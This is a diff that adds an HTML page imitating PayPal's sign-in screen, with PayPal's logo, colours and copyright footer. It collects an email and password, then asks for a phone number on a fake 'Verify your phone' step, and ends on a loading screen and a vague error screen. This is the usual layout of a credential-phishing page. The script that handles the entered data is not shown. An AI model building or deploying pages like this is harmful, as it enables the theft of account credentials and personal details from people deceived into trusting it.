@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <title>PayPal Login</title>
+</head>
+<body>
+  <!-- Login Page -->
+  <div class="container" id="loginPage">
+    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal" class="logo">
+    <h1 style="color: #003087; text-align: center; margin-bottom: 20px; font-size: 24px;">Sign in to PayPal</h1>
+    
+    <div class="input-group">
+      <label for="email">Email</label>
+      <input type="email" id="email" placeholder="Enter your email" required>
+    </div>
+    
+    <div class="input-group">
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Enter your password" required>
+    </div>
+    
+    <button class="btn" onclick="verifyEmail()">Log In</button>
+    
+    <div class="links">
+      <a href="#">Forgot password?</a>
+      <a href="#">Sign Up</a>
+    </div>
+  </div>
+
+  <!-- Phone Verification Page -->
+  <div class="container" id="phoneVerificationPage" style="display: none;">
+    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal" class="logo">
+    <h1 style="color: #003087; text-align: center; margin-bottom: 20px; font-size: 24px;">Verify your phone</h1>
+    <p style="text-align: center; margin-bottom: 20px; color: #666;">Enter the phone number linked to your account.</p>
+    
+    <div class="input-group">
+      <label for="phone">Phone Number</label>
+      <input type="tel" id="phone" placeholder="e.g. 8012345678" maxlength="10">
+    </div>
+    
+    <button class="btn" onclick="verifyPhone()">Continue</button>
+    
+    <div style="text-align: center;">
+      <a href="#" onclick="goBack()" style="color: #0070ba; font-size: 14px; text-decoration: none;">Back to login</a>
+    </div>
+  </div>
+
+  <!-- Loading Screen -->
+  <div class="loading-screen" id="loadingScreen">
+    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="Loading" class="loading-logo">
+  </div>
+
+  <!-- Error Screen -->
+  <div class="error-screen" id="errorScreen">
+    <div class="error-message">error while loading</div>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-links">
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Feedback</a>
+      <a href="#">Cookies</a>
+    </div>
+    <div>© 1999-<span id="currentYear">2024</span> PayPal. All rights reserved.</div>
+  </footer>
+
+  <script src="main.js"></script>
+</body>
+</html>
